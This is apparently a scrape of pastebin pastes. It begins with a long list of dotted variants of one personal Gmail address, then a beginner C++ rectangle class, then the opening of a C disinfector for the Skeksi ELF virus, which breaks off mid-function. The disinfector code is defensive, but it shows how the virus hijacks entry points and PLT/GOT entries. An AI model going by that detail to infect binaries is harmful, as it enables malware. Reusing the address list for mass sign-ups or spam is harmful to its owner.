<a href=""mailto:ibrah.i.m.gud.u.s.u.12.34@gmail.com"">ibrah.i.m.gud.u.s.u.12.34@gmail.com</a>
<a href=""mailto:i.b.r.ah.img.udusu.1.2.3.4@gmail.com"">i.b.r.ah.img.udusu.1.2.3.4@gmail.com</a>
<a href=""mailto:i.bra.himg.u.d.usu1.23.4@gmail.com"">i.bra.himg.u.d.usu1.23.4@gmail.com</a>
<a href=""mailto:i.b.rahi.m.g.u.du.s.u.12.34@gmail.com"">i.b.rahi.m.g.u.du.s.u.12.34@gmail.com</a>
<a href=""mailto:ib.r.a.him.gu.du.s.u.1.23.4@gmail.com"">ib.r.a.him.gu.du.s.u.1.23.4@gmail.com</a>
<a href=""mailto:ibra.hi.m.g.u.du.s.u.123.4@gmail.com"">ibra.hi.m.g.u.du.s.u.123.4@gmail.com</a>
<a href=""mailto:i.bra.h.i.mgu.du.s.u.1.234@gmail.com"">i.bra.h.i.mgu.du.s.u.1.234@gmail.com</a>
<a href=""mailto:i.br.a.hi.m.g.ud.u.s.u.1234@gmail.com"">i.br.a.hi.m.g.ud.u.s.u.1234@gmail.com</a>
<a href=""mailto:i.b.r.a.hi.m.gu.d.u.su12.3.4@gmail.com"">i.b.r.a.hi.m.gu.d.u.su12.3.4@gmail.com</a>
<a href=""mailto:i.br.ahim.g.u.d.us.u.1.23.4@gmail.com"">i.br.ahim.g.u.d.us.u.1.23.4@gmail.com</a>
<a href=""mailto:i.b.rahim.gu.d.u.s.u123.4@gmail.com"">i.b.rahim.gu.d.u.s.u123.4@gmail.com</a>
<a href=""mailto:i.brah.im.gudu.su.12.34@gmail.com"">i.brah.im.gudu.su.12.34@gmail.com</a>
<a href=""mailto:i.b.r.ahimg.ud.us.u12.34@gmail.com"">i.b.r.ahimg.ud.us.u12.34@gmail.com</a>
<a href=""mailto:i.brahi.m.gud.u.su123.4@gmail.com"">i.brahi.m.gud.u.su123.4@gmail.com</a>
<a href=""mailto:i.br.a.hi.m.g.u.d.usu.12.3.4@gmail.com"">i.br.a.hi.m.g.u.d.usu.12.3.4@gmail.com</a>
<a href=""mailto:i.b.r.ahi.mgudu.su1.2.34@gmail.com"">i.b.r.ahi.mgudu.su1.2.34@gmail.com</a>
<a href=""mailto:ib.ra.h.i.m.g.udu.s.u.1.2.3.4@gmail.com"">ib.ra.h.i.m.g.udu.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:i.b.rahimgu.du.s.u123.4@gmail.com"">i.b.rahimgu.du.s.u123.4@gmail.com</a>
<a href=""mailto:i.b.rahim.gudu.s.u1.2.3.4@gmail.com"">i.b.rahim.gudu.s.u1.2.3.4@gmail.com</a>
<a href=""mailto:ibra.h.img.u.d.us.u12.34@gmail.com"">ibra.h.img.u.d.us.u12.34@gmail.com</a>
<a href=""mailto:ib.r.a.h.im.gudusu12.34@gmail.com"">ib.r.a.h.im.gudusu12.34@gmail.com</a>
<a href=""mailto:i.b.ra.him.g.udus.u.1.2.34@gmail.com"">i.b.ra.him.g.udus.u.1.2.34@gmail.com</a>
<a href=""mailto:i.bra.him.g.u.d.usu.1234@gmail.com"">i.bra.him.g.u.d.usu.1234@gmail.com</a>
<a href=""mailto:i.br.a.h.im.g.udu.s.u.1.2.3.4@gmail.com"">i.br.a.h.im.g.udu.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:i.b.r.ah.im.g.udus.u.12.34@gmail.com"">i.b.r.ah.im.g.udus.u.12.34@gmail.com</a>
<a href=""mailto:ibra.h.i.mgudus.u1.2.3.4@gmail.com"">ibra.h.i.mgudus.u1.2.3.4@gmail.com</a>
<a href=""mailto:i.bra.him.gu.d.u.su.1.23.4@gmail.com"">i.bra.him.gu.d.u.su.1.23.4@gmail.com</a>
<a href=""mailto:i.b.r.ah.imgudus.u.12.3.4@gmail.com"">i.b.r.ah.imgudus.u.12.3.4@gmail.com</a>
<a href=""mailto:ibrah.imgu.d.usu1.234@gmail.com"">ibrah.imgu.d.usu1.234@gmail.com</a>
<a href=""mailto:ib.r.a.him.gudus.u1.23.4@gmail.com"">ib.r.a.him.gudus.u1.23.4@gmail.com</a>
<a href=""mailto:ib.rahimgud.u.s.u12.34@gmail.com"">ib.rahimgud.u.s.u12.34@gmail.com</a>
<a href=""mailto:i.b.r.ahimg.ud.u.su1.2.34@gmail.com"">i.b.r.ahimg.ud.u.su1.2.34@gmail.com</a>
<a href=""mailto:ibrah.im.gud.u.s.u12.3.4@gmail.com"">ibrah.im.gud.u.s.u12.3.4@gmail.com</a>
<a href=""mailto:i.br.ah.i.m.gu.d.u.s.u.1.2.3.4@gmail.com"">i.br.ah.i.m.gu.d.u.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:ib.rahi.mg.udu.s.u1.234@gmail.com"">ib.rahi.mg.udu.s.u1.234@gmail.com</a>
<a href=""mailto:ib.ra.h.im.g.udus.u1.2.3.4@gmail.com"">ib.ra.h.im.g.udus.u1.2.3.4@gmail.com</a>
<a href=""mailto:i.brahi.mgu.d.us.u.1.234@gmail.com"">i.brahi.mgu.d.us.u.1.234@gmail.com</a>
<a href=""mailto:ibra.hi.m.gud.u.su1.2.34@gmail.com"">ibra.hi.m.gud.u.su1.2.34@gmail.com</a>
<a href=""mailto:ibra.h.i.m.gu.d.usu.1.23.4@gmail.com"">ibra.h.i.m.gu.d.usu.1.23.4@gmail.com</a>
<a href=""mailto:ib.ra.him.gu.du.su12.3.4@gmail.com"">ib.ra.him.gu.du.su12.3.4@gmail.com</a>
<a href=""mailto:i.b.ra.h.img.udus.u.1.234@gmail.com"">i.b.ra.h.img.udus.u.1.234@gmail.com</a>
<a href=""mailto:i.b.r.ahi.m.g.udus.u12.3.4@gmail.com"">i.b.r.ahi.m.g.udus.u12.3.4@gmail.com</a>
<a href=""mailto:ib.r.a.h.i.mg.ud.u.su.1.2.34@gmail.com"">ib.r.a.h.i.mg.ud.u.su.1.2.34@gmail.com</a>
<a href=""mailto:ib.ra.himg.udus.u.1234@gmail.com"">ib.ra.himg.udus.u.1234@gmail.com</a>
<a href=""mailto:ib.ra.h.i.mgu.d.u.s.u1.234@gmail.com"">ib.ra.h.i.mgu.d.u.s.u1.234@gmail.com</a>
<a href=""mailto:i.br.ah.imgud.us.u.1.234@gmail.com"">i.br.ah.imgud.us.u.1.234@gmail.com</a>
<a href=""mailto:i.b.r.a.himg.ud.u.su.12.3.4@gmail.com"">i.b.r.a.himg.ud.u.su.12.3.4@gmail.com</a>
<a href=""mailto:i.b.r.ahi.m.gu.d.us.u1.2.34@gmail.com"">i.b.r.ahi.m.gu.d.us.u1.2.34@gmail.com</a>
<a href=""mailto:i.br.a.h.im.g.u.du.su1.2.34@gmail.com"">i.br.a.h.im.g.u.du.su1.2.34@gmail.com</a>
<a href=""mailto:i.b.r.a.hi.m.g.u.du.s.u.1.2.3.4@gmail.com"">i.b.r.a.hi.m.g.u.du.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:i.b.rahi.m.gud.usu12.3.4@gmail.com"">i.b.rahi.m.gud.usu12.3.4@gmail.com</a>
<a href=""mailto:ib.r.a.h.imgudu.s.u1.23.4@gmail.com"">ib.r.a.h.imgudu.s.u1.23.4@gmail.com</a>
<a href=""mailto:ib.r.ah.im.gud.u.su1.23.4@gmail.com"">ib.r.ah.im.gud.u.su1.23.4@gmail.com</a>
<a href=""mailto:ib.r.ah.imgudu.su123.4@gmail.com"">ib.r.ah.imgudu.su123.4@gmail.com</a>
<a href=""mailto:ibra.hi.mgudu.s.u12.3.4@gmail.com"">ibra.hi.mgudu.s.u12.3.4@gmail.com</a>
<a href=""mailto:ib.rahim.gu.dus.u.1.2.34@gmail.com"">ib.rahim.gu.dus.u.1.2.34@gmail.com</a>
<a href=""mailto:i.br.ah.i.mgudu.su1.2.34@gmail.com"">i.br.ah.i.mgudu.su1.2.34@gmail.com</a>
<a href=""mailto:ibr.a.h.img.u.du.s.u.123.4@gmail.com"">ibr.a.h.img.u.du.s.u.123.4@gmail.com</a>
<a href=""mailto:ibr.a.h.imgud.u.s.u.12.3.4@gmail.com"">ibr.a.h.imgud.u.s.u.12.3.4@gmail.com</a>
<a href=""mailto:i.b.r.a.himg.ud.u.s.u1.234@gmail.com"">i.b.r.a.himg.ud.u.s.u1.234@gmail.com</a>
<a href=""mailto:i.bra.hi.mg.u.d.u.s.u123.4@gmail.com"">i.bra.hi.mg.u.d.u.s.u123.4@gmail.com</a>
<a href=""mailto:ibr.ahimgu.du.su.1.2.34@gmail.com"">ibr.ahimgu.du.su.1.2.34@gmail.com</a>
<a href=""mailto:i.b.r.ahi.m.g.ud.u.s.u1234@gmail.com"">i.b.r.ahi.m.g.ud.u.s.u1234@gmail.com</a>
<a href=""mailto:i.brah.im.gu.dusu1234@gmail.com"">i.brah.im.gu.dusu1234@gmail.com</a>
<a href=""mailto:i.br.a.him.g.u.d.us.u12.3.4@gmail.com"">i.br.a.him.g.u.d.us.u12.3.4@gmail.com</a>
<a href=""mailto:i.brahi.mgu.du.s.u.12.3.4@gmail.com"">i.brahi.mgu.du.s.u.12.3.4@gmail.com</a>
<a href=""mailto:i.br.a.h.i.m.gu.d.u.s.u12.34@gmail.com"">i.br.a.h.i.m.gu.d.u.s.u12.34@gmail.com</a>
<a href=""mailto:ibra.hi.mg.ud.usu1.2.3.4@gmail.com"">ibra.hi.mg.ud.usu1.2.3.4@gmail.com</a>
<a href=""mailto:ib.rahim.gu.d.usu1.23.4@gmail.com"">ib.rahim.gu.d.usu1.23.4@gmail.com</a>
<a href=""mailto:i.b.ra.hi.mgu.dusu1.2.34@gmail.com"">i.b.ra.hi.mgu.dusu1.2.34@gmail.com</a>
<a href=""mailto:ibra.him.g.ud.u.su12.34@gmail.com"">ibra.him.g.ud.u.su12.34@gmail.com</a>
<a href=""mailto:ibr.a.h.i.m.g.ud.u.s.u1234@gmail.com"">ibr.a.h.i.m.g.ud.u.s.u1234@gmail.com</a>
<a href=""mailto:i.b.r.a.himgudu.su1.2.3.4@gmail.com"">i.b.r.a.himgudu.su1.2.3.4@gmail.com</a>
<a href=""mailto:i.b.ra.hi.m.gu.du.s.u.1.23.4@gmail.com"">i.b.ra.hi.m.gu.du.s.u.1.23.4@gmail.com</a>
<a href=""mailto:i.b.rahi.mg.udu.s.u.1.2.3.4@gmail.com"">i.b.rahi.mg.udu.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:ib.r.ah.im.g.u.d.u.su.1.2.34@gmail.com"">ib.r.ah.im.g.u.d.u.su.1.2.34@gmail.com</a>
<a href=""mailto:i.b.ra.hi.m.gu.du.s.u123.4@gmail.com"">i.b.ra.hi.m.gu.du.s.u123.4@gmail.com</a>
<a href=""mailto:ib.ra.himgu.d.u.su.1.2.3.4@gmail.com"">ib.ra.himgu.d.u.su.1.2.3.4@gmail.com</a>
<a href=""mailto:i.bra.h.i.m.g.u.d.u.s.u.1.2.34@gmail.com"">i.bra.h.i.m.g.u.d.u.s.u.1.2.34@gmail.com</a>
<a href=""mailto:i.b.rahi.m.g.udusu.12.3.4@gmail.com"">i.b.rahi.m.g.udusu.12.3.4@gmail.com</a>
<a href=""mailto:i.b.rah.i.mg.ud.u.s.u1.2.34@gmail.com"">i.b.rah.i.mg.ud.u.s.u1.2.34@gmail.com</a>
<a href=""mailto:ib.ra.him.gud.u.s.u123.4@gmail.com"">ib.ra.him.gud.u.s.u123.4@gmail.com</a>
<a href=""mailto:ib.r.a.h.i.mg.u.du.s.u1.234@gmail.com"">ib.r.a.h.i.mg.u.du.s.u1.234@gmail.com</a>
<a href=""mailto:i.br.a.h.im.g.ud.us.u123.4@gmail.com"">i.br.a.h.im.g.ud.us.u123.4@gmail.com</a>
<a href=""mailto:ib.r.ahi.mgud.usu.12.3.4@gmail.com"">ib.r.ahi.mgud.usu.12.3.4@gmail.com</a>
<a href=""mailto:i.br.a.him.gud.u.s.u1.2.3.4@gmail.com"">i.br.a.him.gud.u.s.u1.2.3.4@gmail.com</a>
<a href=""mailto:i.br.ahim.gudu.su.12.3.4@gmail.com"">i.br.ahim.gudu.su.12.3.4@gmail.com</a>
<a href=""mailto:i.b.r.ahi.m.gu.dus.u1.23.4@gmail.com"">i.b.r.ahi.m.gu.dus.u1.23.4@gmail.com</a>
<a href=""mailto:i.br.a.h.i.m.g.u.d.usu1.2.34@gmail.com"">i.br.a.h.i.m.g.u.d.usu1.2.34@gmail.com</a>
<a href=""mailto:ib.rahim.g.ud.u.su.123.4@gmail.com"">ib.rahim.g.ud.u.su.123.4@gmail.com</a>
<a href=""mailto:ibr.ah.img.ud.u.su.1.2.34@gmail.com"">ibr.ah.img.ud.u.su.1.2.34@gmail.com</a>
<a href=""mailto:ib.r.ahimgudus.u.123.4@gmail.com"">ib.r.ahimgudus.u.123.4@gmail.com</a>
<a href=""mailto:i.b.ra.h.i.m.g.udu.s.u12.3.4@gmail.com"">i.b.ra.h.i.m.g.udu.s.u12.3.4@gmail.com</a>
<a href=""mailto:ibra.h.im.gu.du.su1.2.34@gmail.com"">ibra.h.im.gu.du.su1.2.34@gmail.com</a>
<a href=""mailto:i.b.r.a.h.i.m.g.udusu.1.23.4@gmail.com"">i.b.r.a.h.i.m.g.udusu.1.23.4@gmail.com</a>
<a href=""mailto:i.bra.h.i.mgu.dusu12.3.4@gmail.com"">i.bra.h.i.mgu.dusu12.3.4@gmail.com</a>
<a href=""mailto:ibra.hi.m.g.u.dus.u.1.2.34@gmail.com"">ibra.hi.m.g.u.dus.u.1.2.34@gmail.com</a>
<a href=""mailto:ibrahimgu.dus.u.12.3.4@gmail.com"">ibrahimgu.dus.u.12.3.4@gmail.com</a>
<a href=""mailto:ib.ra.himgu.d.u.su1.23.4@gmail.com"">ib.ra.himgu.d.u.su1.23.4@gmail.com</a>
<a href=""mailto:i.br.a.h.i.m.gudu.s.u1234@gmail.com"">i.br.a.h.i.m.gudu.s.u1234@gmail.com</a>
<a href=""mailto:ib.r.a.hi.mg.u.d.u.s.u.1234@gmail.com"">ib.r.a.hi.mg.u.d.u.s.u.1234@gmail.com</a>
<a href=""mailto:i.br.a.h.im.gudusu.1234@gmail.com"">i.br.a.h.im.gudusu.1234@gmail.com</a>
<a href=""mailto:i.b.ra.hi.mg.udus.u.1.2.34@gmail.com"">i.b.ra.hi.mg.udus.u.1.2.34@gmail.com</a>
<a href=""mailto:i.br.ahi.mg.ud.us.u1.2.34@gmail.com"">i.br.ahi.mg.ud.us.u1.2.34@gmail.com</a>
<a href=""mailto:ib.rah.i.mgud.usu12.3.4@gmail.com"">ib.rah.i.mgud.usu12.3.4@gmail.com</a>
<a href=""mailto:i.b.rah.i.mgu.d.usu12.3.4@gmail.com"">i.b.rah.i.mgu.d.usu12.3.4@gmail.com</a>
<a href=""mailto:ib.r.ahi.mgudus.u.12.3.4@gmail.com"">ib.r.ahi.mgudus.u.12.3.4@gmail.com</a>
<a href=""mailto:i.b.r.ah.im.g.u.d.us.u123.4@gmail.com"">i.b.r.ah.im.g.u.d.us.u123.4@gmail.com</a>
<a href=""mailto:ibr.a.h.i.mgu.d.us.u.1.23.4@gmail.com"">ibr.a.h.i.mgu.d.us.u.1.23.4@gmail.com</a>
<a href=""mailto:ibr.a.himgu.d.u.su1.234@gmail.com"">ibr.a.himgu.d.u.su1.234@gmail.com</a>
<a href=""mailto:ib.r.a.him.g.u.du.su1.2.34@gmail.com"">ib.r.a.him.g.u.du.su1.2.34@gmail.com</a>
<a href=""mailto:ibrahi.mgu.d.u.su.1.23.4@gmail.com"">ibrahi.mgu.d.u.su.1.23.4@gmail.com</a>
<a href=""mailto:i.b.ra.h.i.m.g.u.d.u.su1.2.3.4@gmail.com"">i.b.ra.h.i.m.g.u.d.u.su1.2.3.4@gmail.com</a>
<a href=""mailto:ibra.hi.mg.u.d.u.su.1.23.4@gmail.com"">ibra.hi.mg.u.d.u.su.1.23.4@gmail.com</a>
<a href=""mailto:ibra.h.i.m.g.u.d.usu12.34@gmail.com"">ibra.h.i.m.g.u.d.usu12.34@gmail.com</a>
<a href=""mailto:ibr.a.h.im.gu.du.s.u.12.3.4@gmail.com"">ibr.a.h.im.gu.du.s.u.12.3.4@gmail.com</a>
<a href=""mailto:ib.ra.h.imgud.us.u12.34@gmail.com"">ib.ra.h.imgud.us.u12.34@gmail.com</a>
<a href=""mailto:ibrah.i.m.g.u.du.s.u.1.2.34@gmail.com"">ibrah.i.m.g.u.du.s.u.1.2.34@gmail.com</a>
<a href=""mailto:ib.r.a.h.im.g.u.d.u.s.u.1.234@gmail.com"">ib.r.a.h.im.g.u.d.u.s.u.1.234@gmail.com</a>
<a href=""mailto:ibr.a.him.g.u.du.s.u.123.4@gmail.com"">ibr.a.him.g.u.du.s.u.123.4@gmail.com</a>
<a href=""mailto:i.b.rahi.mg.udu.s.u1.2.3.4@gmail.com"">i.b.rahi.mg.udu.s.u1.2.3.4@gmail.com</a>
<a href=""mailto:i.bra.h.i.m.gud.u.su12.3.4@gmail.com"">i.bra.h.i.m.gud.u.su12.3.4@gmail.com</a>
<a href=""mailto:ib.rahim.g.u.dusu.1.23.4@gmail.com"">ib.rahim.g.u.dusu.1.23.4@gmail.com</a>
<a href=""mailto:ibr.ahimg.u.d.u.s.u.1.23.4@gmail.com"">ibr.ahimg.u.d.u.s.u.1.23.4@gmail.com</a>
<a href=""mailto:i.bra.h.img.udus.u12.3.4@gmail.com"">i.bra.h.img.udus.u12.3.4@gmail.com</a>
<a href=""mailto:ibra.himg.udusu1.234@gmail.com"">ibra.himg.udusu1.234@gmail.com</a>
<a href=""mailto:ibr.a.hi.m.g.u.du.su.1.2.3.4@gmail.com"">ibr.a.hi.m.g.u.du.su.1.2.3.4@gmail.com</a>
<a href=""mailto:i.b.r.ah.i.mg.udu.su12.34@gmail.com"">i.b.r.ah.i.mg.udu.su12.34@gmail.com</a>
<a href=""mailto:i.bra.him.gu.du.s.u1.23.4@gmail.com"">i.bra.him.gu.du.s.u1.23.4@gmail.com</a>
<a href=""mailto:ibrah.imgudusu.1234@gmail.com"">ibrah.imgudusu.1234@gmail.com</a>
<a href=""mailto:i.b.r.a.h.i.mgu.d.usu1.234@gmail.com"">i.b.r.a.h.i.mgu.d.usu1.234@gmail.com</a>
<a href=""mailto:ib.r.a.him.g.u.d.u.su.12.34@gmail.com"">ib.r.a.him.g.u.d.u.su.12.34@gmail.com</a>
<a href=""mailto:i.b.r.ahim.gud.u.su1.23.4@gmail.com"">i.b.r.ahim.gud.u.su1.23.4@gmail.com</a>
<a href=""mailto:i.brah.imgud.usu1234@gmail.com"">i.brah.imgud.usu1234@gmail.com</a>
<a href=""mailto:i.b.ra.h.i.mgu.dusu.12.3.4@gmail.com"">i.b.ra.h.i.mgu.dusu.12.3.4@gmail.com</a>
<a href=""mailto:i.brahi.m.gu.d.us.u.1.2.3.4@gmail.com"">i.brahi.m.gu.d.us.u.1.2.3.4@gmail.com</a>
<a href=""mailto:i.b.rahim.gu.d.u.s.u.1234@gmail.com"">i.b.rahim.gu.d.u.s.u.1234@gmail.com</a>
<a href=""mailto:ib.r.ahi.mg.ud.u.s.u.1.234@gmail.com"">ib.r.ahi.mg.ud.u.s.u.1.234@gmail.com</a>
<a href=""mailto:i.b.rah.imgud.us.u1234@gmail.com"">i.b.rah.imgud.us.u1234@gmail.com</a>
<a href=""mailto:i.bra.hi.m.gu.d.u.s.u12.34@gmail.com"">i.bra.hi.m.gu.d.u.s.u12.34@gmail.com</a>
<a href=""mailto:ib.r.ahimgudu.s.u.1.2.3.4@gmail.com"">ib.r.ahimgudu.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:ibr.ahi.m.gudusu12.3.4@gmail.com"">ibr.ahi.m.gudusu12.3.4@gmail.com</a>
<a href=""mailto:i.b.r.a.h.i.m.gu.du.s.u1.2.34@gmail.com"">i.b.r.a.h.i.m.gu.du.s.u1.2.34@gmail.com</a>
<a href=""mailto:i.br.ahi.mgu.d.u.su.1.234@gmail.com"">i.br.ahi.mgu.d.u.su.1.234@gmail.com</a>
<a href=""mailto:ibr.a.himgudu.s.u1.2.3.4@gmail.com"">ibr.a.himgudu.s.u1.2.3.4@gmail.com</a>
<a href=""mailto:ibrah.i.mgudus.u1.23.4@gmail.com"">ibrah.i.mgudus.u1.23.4@gmail.com</a>
<a href=""mailto:i.b.rah.i.mgu.d.u.su.1.2.34@gmail.com"">i.b.rah.i.mgu.d.u.su.1.2.34@gmail.com</a>
<a href=""mailto:i.b.r.ah.im.g.u.dus.u.1.2.3.4@gmail.com"">i.b.r.ah.im.g.u.dus.u.1.2.3.4@gmail.com</a>
<a href=""mailto:i.br.ahi.m.gud.usu.1.2.3.4@gmail.com"">i.br.ahi.m.gud.usu.1.2.3.4@gmail.com</a>
<a href=""mailto:ibra.h.im.g.udus.u.12.3.4@gmail.com"">ibra.h.im.g.udus.u.12.3.4@gmail.com</a>
<a href=""mailto:ib.r.a.h.img.ud.u.s.u1.2.34@gmail.com"">ib.r.a.h.img.ud.u.s.u1.2.34@gmail.com</a>
<a href=""mailto:ibr.a.h.imgudus.u.12.3.4@gmail.com"">ibr.a.h.imgudus.u.12.3.4@gmail.com</a>
<a href=""mailto:i.brah.i.mg.u.d.u.s.u.1.2.3.4@gmail.com"">i.brah.i.mg.u.d.u.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:ibra.h.img.u.dus.u1.2.34@gmail.com"">ibra.h.img.u.dus.u1.2.34@gmail.com</a>
<a href=""mailto:i.b.r.a.him.g.u.d.u.s.u12.3.4@gmail.com"">i.b.r.a.him.g.u.d.u.s.u12.3.4@gmail.com</a>
<a href=""mailto:i.br.ah.i.mg.u.du.s.u1.234@gmail.com"">i.br.ah.i.mg.u.du.s.u1.234@gmail.com</a>
<a href=""mailto:ibrah.imgud.usu1.234@gmail.com"">ibrah.imgud.usu1.234@gmail.com</a>
<a href=""mailto:ibrahi.mg.u.d.us.u1.234@gmail.com"">ibrahi.mg.u.d.us.u1.234@gmail.com</a>
<a href=""mailto:ibrah.i.m.gu.d.us.u12.34@gmail.com"">ibrah.i.m.gu.d.us.u12.34@gmail.com</a>
<a href=""mailto:ibr.a.h.i.mgu.d.u.su1.2.34@gmail.com"">ibr.a.h.i.mgu.d.u.su1.2.34@gmail.com</a>
<a href=""mailto:ibr.a.h.i.m.g.u.d.us.u1.2.34@gmail.com"">ibr.a.h.i.m.g.u.d.us.u1.2.34@gmail.com</a>
<a href=""mailto:ib.ra.h.i.mgudus.u.123.4@gmail.com"">ib.ra.h.i.mgudus.u.123.4@gmail.com</a>
<a href=""mailto:i.bra.hi.mg.u.dusu.1234@gmail.com"">i.bra.hi.mg.u.dusu.1234@gmail.com</a>
<a href=""mailto:ibrahi.mgu.du.s.u.1.2.3.4@gmail.com"">ibrahi.mgu.du.s.u.1.2.3.4@gmail.com</a>
<a href=""mailto:ibrah.i.m.gudu.su.1.234@gmail.com"">ibrah.i.m.gudu.su.1.234@gmail.com</a>
<a href=""mailto:i.bra.h.i.mg.ud.us.u1234@gmail.com"">i.bra.h.i.mg.ud.us.u1234@gmail.com</a>
<a href=""mailto:i.bra.h.img.u.du.su123.4@gmail.com"">i.bra.h.img.u.du.su123.4@gmail.com</a>
<a href=""mailto:i.b.r.ahi.m.gu.dusu1.2.34@gmail.com"">i.b.r.ahi.m.gu.dusu1.2.34@gmail.com</a>
<a href=""mailto:i.br.ahi.mg.u.dusu1.2.34@gmail.com"">i.br.ahi.mg.u.dusu1.2.34@gmail.com</a>
<a href=""mailto:i.bra.h.img.udu.s.u.1234@gmail.com"">i.bra.h.img.udu.s.u.1234@gmail.com</a>
<a href=""mailto:ibra.himgud.us.u12.3.4@gmail.com"">ibra.himgud.us.u12.3.4@gmail.com</a>
<a href=""mailto:i.br.a.himgudusu.123.4@gmail.com"">i.br.a.himgudusu.123.4@gmail.com</a>
<a href=""mailto:ibrahim.gu.d.u.su.12.3.4@gmail.com"">ibrahim.gu.d.u.su.12.3.4@gmail.com</a>
<a href=""mailto:ibrah.imgu.du.su12.34@gmail.com"">ibrah.imgu.du.su12.34@gmail.com</a>"
64egtVq0,Classe Retângulo Cpp,wagner-cipriano,C++,Sunday 18th of June 2023 10:36:11 AM CDT,"#include <iostream>
using namespace std;

class Retangulo {
  //private:
    int largura;
    int altura;

  public:
    float border_width = 0.5;
    int getAltura() {
      return altura;
    }
    int getLargura() {
      return largura;
    }
    void setAltura(int a) {
      altura = a;
    }
    void setLargura(int l) {
      largura = l;
    }
    Retangulo(int a, int l) {
      altura = a;
      largura = l;
    }
    int area() {
      return largura * altura;
    }
    int perimetro() {
      return 2 * (largura + altura);
    }
    void imprime() {
      cout << ""\nRetangulo maneiro:\n  Borda:    "" << border_width << ""\n  Largura:   "" << largura
           <<  ""\n  Altura :   "" << altura  << ""\n  Area:      "" << area()  << ""\n  Perimetro: "" << perimetro() << endl;
    }
};


int main () {
  Retangulo *r = new Retangulo(2, 4);
  int p = (*r).perimetro();
  (*r).imprime();
  (*r).setAltura(3);
  (*r).setLargura(3);
  (*r).imprime();

  //cout << ""Largura: "" << (*r).largura;  //Erro largura is private
  cout << ""\n\nLargura: "" << (*r).getLargura();  //Ok
  cout << ""\nAlgura:    "" << (*r).getAltura();  //Ok
  cout << ""\nPerimetro: "" << (*r).perimetro();  //Ok

  return 0;
}
"
jT46V8vr,skesi_virus (disinfector),FlyFar,C,Sunday 18th of June 2023 10:21:33 AM CDT,"/*
 * Skeksi Virus disinfector, by ElfMaster. January 2016
 *
 * -= About:
 * This disinfector is the first prototype, it is written for those who may have been so unfortunate
 * as to infect their own system. The disinfector will work any infected ET_EXEC file, provided that
 * it has section headers. This is somewhat of a weakness considering the Virus itself works on executables
 * that have no section headers. If you need to change this, its pretty easy, just parse the program
 * headers and get PT_DYNAMIC, and then use the D_TAG's to find the PLT/GOT, Relocation, and dynamic
 * symbol table. 
 *
 * -= Usage:
 * gcc -O2 skeksi_disinfect.c -o disinfect
 * ./disinfect <executable>

 * elfmaster [4t] zoho.com
 */

#include <stdarg.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>
#include <errno.h>

typedef struct elfdesc {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	Elf64_Addr textVaddr;
	Elf64_Addr dataVaddr;
	Elf64_Addr dataOff;
	size_t textSize;
	size_t dataSize;
	uint8_t *mem;
	struct stat st;
	char *path;
} elfdesc_t;

#define TMP "".disinfect_file.xyz""

/*
 * If we find push/ret, and the address
 * being pushed is within the text segment
 * of the regular x86_64 text range per the
 * default linker script, then we are probably
 * in good shape. 
 * note: 0x400000 is the default text base
 */
uint32_t locate_orig_entry(elfdesc_t *elf)
{
	uint32_t i, entry;
        uint8_t *mem = elf->mem;
        for (i = 0; i < elf->st.st_size; i++) {
                if (mem[0] == 0x68 && mem[5] == 0xc3) {
			entry = *(uint32_t *)&mem[1];
			if (entry >= 0x400000 && entry < 0x4fffff) 
				return entry;
		}
	}
	return 0; // couldn't find it, uh oh!
}	

uint32_t locate_glibc_init_offset(elfdesc_t *elf)
{
	uint32_t i;
	uint8_t *mem = elf->mem;
	
	for (i = 0; i < elf->st.st_size; i++) {
		if (
		mem[i + 0] == 0x31 && mem[i + 1] == 0xed &&
		mem[i + 2] == 0x49 && mem[i + 3] == 0x89 &&
		mem[i + 4] == 0xd1 && mem[i + 5] == 0x5e &&
		mem[i + 6] == 0x48 && mem[i + 7] == 0x89 && mem[i + 8] == 0xe2)
			return i;
	}

	return 0;
}
	
int disinfect_pltgot(elfdesc_t *elf)
{
	Elf64_Ehdr *ehdr = elf->ehdr;
	Elf64_Phdr *phdr = elf->phdr;
	Elf64_Shdr *shdr = elf->shdr;
	uint8_t *mem = elf->mem;
	Elf64_Sym *symtab = NULL;
	Elf64_Rela *rela = NULL;
	Elf64_Addr addr = 0, plt_addr = 0;
	Elf64_Off plt_off = 0, gotoff = 0;
	size_t plt_size = 0, symtab_size = 0, rela_size = 0;
  	char *shstrtab = (char *)&mem[shdr[elf->ehdr->e_shstrndx].sh_offset];
	char *strtab = NULL;
	uint8_t *gotptr, *plt;
	int i, j, symindex = 0, c = 0;

	for (i = 0; i < ehdr->e_shnum; i++) {
		switch(shdr[i].sh_type) {
			case SHT_DYNSYM:
				symtab = (Elf64_Sym *)&mem[shdr[i].sh_offset];
				symtab_size = shdr[i].sh_size;
				strtab = (char *)&mem[shdr[shdr[i].sh_link].sh_offset];
				break;
			case SHT_RELA:
				if (!strcmp(&shstrtab[shdr[i].sh_name], "".rela.plt"")) {
					rela = (Elf64_Rela *)&mem[shdr[i].sh_offset];
					rela_size = shdr[i].sh_size;
				}
				break;	
			case SHT_PROGBITS:
				if (!strcmp(&shstrtab[shdr[i].sh_name], "".plt"")) {
					plt_off = shdr[i].sh_offset;
					plt_addr = shdr[i].sh_addr;
					plt_size = shdr[i].sh_size;
				}
				break;
		}
	}
	if (plt_off == 0 || symtab == NULL || rela == NULL) {
		printf(""Unable to find relocation/symbol/plt info\n"");
		return -1;
	}
	
	plt = &mem[plt_off]; // point at PLT, right past PLT-0
	for (i = 0; i < rela_size/sizeof(Elf64_Rela); i++) {
		
		symindex = ELF64_R_SYM(rela->r_info);
		if (!strcmp(&strtab[symtab[ELF64_R_SYM(rela->r_info)].st_name], ""puts"")) {
			printf(""Attempting to disinfect PLT/GOT\n"");
			gotoff = elf->dataOff + (rela->r_offset - elf->dataVaddr);
			gotptr = &mem[gotoff];
			addr = gotptr[0] + (gotptr[1] << 8) + (gotptr[2] << 16) + (gotptr[3] << 24);
